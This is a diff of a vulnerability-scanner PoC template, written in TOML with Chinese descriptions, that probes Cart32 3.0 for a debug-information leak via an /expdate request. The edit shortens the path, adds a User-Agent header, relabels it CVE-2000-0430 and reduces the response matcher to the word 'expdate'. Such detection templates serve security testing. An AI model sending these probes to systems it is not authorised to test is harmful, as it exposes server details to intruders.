@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 Cart32 3.0 的 cart32.exe 发送附加 /expdate 路径的 HTTP 请求，检测是否存在敏感调试信息泄露漏洞。若服务器返回包含调试变量、管理目录路径等敏感信息的页面，则判定存在漏洞。"
+description = "验证 Cart32 3.0 管理调试信息泄露漏洞：通过在目标 URL 后追加 /expdate 路径访问敏感调试信息"
 id = "POC-AVE-2000-0353"
-name = "Cart32 3.0 expdate 敏感调试信息泄露漏洞 PoC"
+name = "CVE-2000-0430 PoC"
 severity = "medium"
 tags = ["ave-2000-0353"]
 vuln_id = [
@@ -15,16 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/cart32.exe/expdate"
+path = "/{{BaseURL}}/expdate"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "SERVER_SOFTWARE",
-    "SERVER_NAME",
-    "HTTP_HOST",
-    "cart32",
-]
+words = ["expdate"]
